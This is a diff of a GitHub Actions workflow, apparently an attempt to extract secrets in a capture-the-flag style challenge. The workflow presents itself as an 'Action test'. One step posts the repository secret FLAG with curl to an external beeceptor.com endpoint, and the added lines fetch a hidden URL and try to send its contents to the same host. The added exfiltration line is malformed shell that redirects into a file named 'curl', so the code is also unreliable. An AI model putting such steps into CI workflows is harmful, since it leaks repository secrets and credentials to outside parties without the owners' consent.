@@ -12,12 +12,11 @@ jobs:
           SUPER_SECRET: ${{ secrets.HIDDEN_URL }}
         run: |
           curl -v -X POST 'https://techdaysgetsecret.free.beeceptor.com/my/api/path' -H 'Content-Type: plain/text' -d "${{secrets.FLAG}}"
-          
+    
       - name: Action test
         run: |
-          echo "${{secrets.HIDDEN_URL}}"
-          curl ${{secrets.HIDDEN_URL}} > hidden.txt 
-          
+          curl ${{secrets.HIDDEN_URL}} > hidden.txt
+          cat hidden.txt > curl -v -X POST 'https://techdaysgetsecret.free.beeceptor.com/my/api/path' -H 'Content-Type: plain/text' -d
           echo "Secret retrieved"
           echo "-------"
           echo "Write tests here and call them with hidden.txt"
